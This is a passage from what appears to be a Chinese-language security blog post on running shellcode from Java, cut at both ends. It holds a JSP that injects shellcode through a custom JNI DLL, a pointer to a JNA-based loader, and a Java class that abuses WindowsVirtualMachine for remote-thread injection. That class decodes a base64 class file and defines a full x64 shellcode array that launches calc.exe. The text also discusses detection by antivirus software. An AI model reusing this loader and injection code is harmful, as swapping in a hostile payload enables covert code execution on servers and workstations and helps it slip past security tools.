class="hljs-keyword">byte</span>) <span class="hljs-number">0xba</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xa6</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x95</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xbd</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x9d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd5</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x83</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc4</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x28</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x3c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x06</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x7c</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x80</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xfb</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x75</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x05</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xbb</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x47</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x13</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x72</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x6f</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x6a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x59</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x89</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xda</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd5</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x63</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x61</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x6c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x63</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x2e</span>,<br>                    (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x65</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x78</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x65</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span><br>            &#125;;<br><br>    System.load(<span class="hljs-string">&quot;D:\\VSProject\\testjsp\\x64\\Release\\testjsp.dll&quot;</span>);<br>    JniClass jniDemo = <span class="hljs-keyword">new</span> JniClass();<br>    jniDemo.inject(buf);<br>%&gt;<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/XYZD41"><img src="https://s1.ax1x.com/2022/06/01/XYZD41.png" alt="XYZD41.png"></a></p><h1 id="JNA"><a href="#JNA" class="headerlink" title="JNA"></a>JNA</h1><p>通过JNA可以直接在java中调用c函数，不需要自己再写一个dll了。直接参考开源项目：<a href="https://github.com/yzddmr6/Java-Shellcode-Loader">https://github.com/yzddmr6/Java-Shellcode-Loader</a></p><p>缺点：</p><ol><li>需要集成jna的依赖，体积大</li><li>jna为了实现调用dll文件，也会生成一个jni的dll文件。而这个dll文件并没有签名，所以遇到杀软一样被查</li></ol><p>代码一样，只是在java里面调用</p><p><a href="https://imgtu.com/i/XYZG90"><img src="https://s1.ax1x.com/2022/06/01/XYZG90.png" alt="XYZG90.png"></a><br><a href="https://imgtu.com/i/XYZ1Nn"><img src="https://s1.ax1x.com/2022/06/01/XYZ1Nn.png" alt="XYZ1Nn.png"></a></p><p>打包用java -jar直接执行，也可以用UrlClassLoader加载jar包</p><p><a href="https://imgtu.com/i/XYZs9x"><img src="https://s1.ax1x.com/2022/06/01/XYZs9x.png" alt="XYZs9x.png"></a></p><h1 id="WindowsVirtualMachine"><a href="#WindowsVirtualMachine" class="headerlink" title="WindowsVirtualMachine"></a>WindowsVirtualMachine</h1><p><code>sun.tools.attach.WindowsVirtualMachine</code>类中包含了远线程注入的代码，可以直接利用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WindowsAgentShellcodeLoader</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            String classStr = <span class="hljs-string">&quot;yv66vgAAADQAMgoABwAjCAAkCgAlACYF//////////8IACcHACgKAAsAKQcAKgoACQArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAChMc3VuL3Rvb2xzL2F0dGFjaC9XaW5kb3dzVmlydHVhbE1hY2hpbmU7AQAHZW5xdWV1ZQEAPShKW0JMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9PYmplY3Q7KVYBAApFeGNlcHRpb25zBwAtAQALb3BlblByb2Nlc3MBAAQoSSlKAQADcnVuAQAFKFtCKVYBAAR2YXIyAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQADYnVmAQACW0IBAA1TdGFja01hcFRhYmxlBwAqAQAKU291cmNlRmlsZQEAGldpbmRvd3NWaXJ0dWFsTWFjaGluZS5qYXZhDAAMAA0BAAZhdHRhY2gHAC4MAC8AMAEABHRlc3QBABBqYXZhL2xhbmcvT2JqZWN0DAATABQBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAAxAA0BACZzdW4vdG9vbHMvYXR0YWNoL1dpbmRvd3NWaXJ0dWFsTWFjaGluZQEAE2phdmEvaW8vSU9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQALbG9hZExpYnJhcnkBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAA9wcmludFN0YWNrVHJhY2UAIQALAAcAAAAAAAQAAQAMAA0AAQAOAAAAMwABAAEAAAAFKrcAAbEAAAACAA8AAAAKAAIAAAAGAAQABwAQAAAADAABAAAABQARABIAAAGIABMAFAABABUAAAAEAAEAFgEIABcAGAABABUAAAAEAAEAFgAJABkAGgABAA4AAAB6AAYAAgAAAB0SArgAAxQABCoSBhIGA70AB7gACKcACEwrtgAKsQABAAUAFAAXAAkAAwAPAAAAGgAGAAAADgAFABAAFAATABcAEQAYABIAHAAVABAAAAAWAAIAGAAEABsAHAABAAAAHQAdAB4AAAAfAAAABwACVwcAIAQAAQAhAAAAAgAi&quot;</span>;<br>            Class clazz = <span class="hljs-keyword">new</span> MyClassLoader().get(Base64.getDecoder().decode(classStr));<br><br><br>            <span class="hljs-keyword">byte</span> buf[] = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]<br>                    &#123;<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xfc</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x83</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe4</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xf0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe8</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x51</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x50</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x51</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x56</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd2</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x65</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x60</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x18</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x72</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x50</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0f</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xb7</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc0</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xac</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x3c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x61</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x7c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x02</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x2c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe2</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xed</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x51</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x42</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x3c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x80</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x88</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x85</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x74</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x67</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x50</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x18</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x44</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x40</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe3</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x56</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x34</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x88</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd6</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc0</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xac</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc1</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x38</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x75</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xf1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x03</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x4c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x24</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x08</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x45</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x39</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd1</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x75</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd8</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x44</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x40</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x24</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x66</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x44</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x40</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x1c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x49</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x04</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x88</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5e</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x59</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5a</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x59</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x83</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xec</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x20</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x52</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x58</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x59</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x12</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe9</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x57</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x5d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xba</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8d</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x01</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xba</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x31</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x8b</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x6f</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x87</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd5</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xbb</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xf0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xb5</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xa2</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x56</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xba</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xa6</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x95</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xbd</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x9d</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd5</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x48</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x83</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xc4</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x28</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x3c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x06</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x7c</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x0a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x80</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xfb</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xe0</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x75</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x05</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xbb</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x47</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x13</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x72</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x6f</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x6a</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x59</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x41</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x89</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xda</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xff</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0xd5</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x63</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x61</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x6c</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x63</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x2e</span>,<br>                            (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x65</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x78</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x65</span>, (<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x00</span><br>                    &#125;;<br><br>            ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> 